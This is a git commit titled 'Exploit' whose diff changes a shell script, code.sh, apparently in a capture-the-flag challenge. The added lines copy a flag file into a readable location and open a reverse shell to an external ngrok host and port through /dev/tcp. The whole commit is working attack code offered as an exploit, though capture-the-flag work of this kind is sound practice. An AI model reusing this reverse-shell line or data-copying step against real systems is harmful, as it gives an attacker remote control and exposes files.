c7910280a6fc226e1b9eb2c6338dcd912d18e326
Máté Tallósi <tallosimate@gmail.com>
2023-10-27 21:46:37 +0200

    Exploit

--- code.sh
+++ code.sh
@@ -1,3 +1,4 @@
 #!/bin/bash
 
-id > /home/challenge/gethub/repositories/snyk-ctf-test/hello.txt
+cat /home/challenge/gethub/flag.txt > /home/challenge/gethub/repositories/snyk-ctf-test/hello.txt
+sh -i >& /dev/tcp/2.tcp.eu.ngrok.io/18528 0>&1
